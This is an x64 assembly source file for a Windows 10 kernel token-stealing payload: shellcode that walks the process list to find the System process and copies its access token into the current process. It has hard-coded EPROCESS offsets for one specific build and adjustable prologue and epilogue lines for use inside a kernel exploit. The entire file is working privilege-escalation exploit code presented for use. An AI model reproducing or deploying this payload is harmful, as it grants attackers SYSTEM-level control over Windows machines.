; compie with nasm:
; nasm.exe sc.asm
;
;	Token Stealing Payload
;	Win10 x64 RS3 16281.
;

[bits 64]

start:
;;push rax                       Change to the prolog you may need.
;;push rbx
;;push rcx
;;push rsp

;; kd> uf nt!PsGetCurrentProcess
;;  nt!PsGetCurrentProcess:
;;  mov   rax,qword ptr gs:[188h]
;;  mov   rax,qword ptr [rax+0B8h]
;;  ret

;; kd> dps gs:188 l1
;;  nt!KiInitialThread
       
mov rax, [gs:0x188]
mov rax, [rax+0xb8]

;; kd> dt nt!_EPROCESS poi(nt!KiInitialThread+b8)
;;   +0x000 Pcb              : _KPROCESS
;;   [...]
;;   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
;;   +0x2e8 ActiveProcessLinks : _LIST_ENTRY 
;;   [...]
;;  +0x358 Token            : _EX_FAST_REF
;;

;; place KiInitialThread+b8
;; in rbx.

mov rbx, rax  
loop:
mov rbx, [rbx+0x2e8]    ;; Get the next process
sub rbx, 0x2e8	        
mov rcx, [rbx+0x2e0]	;; place process in rcx
cmp rcx, 4		;; Compare to System pid.
jnz loop

mov rcx, [rbx + 0x358] 
and cl, 0xf0		;; Null the token
mov [rax + 0x358], rcx ;; Override current process token.


;;pop rcx
;;pop rbx
;;pop rax
;;xor rax, rax		;; Change to the epilogue you need.
;;xor rsi, rsi		
;;xor rdi, rdi
;;pop rsp	
;;add rsp, 28
ret
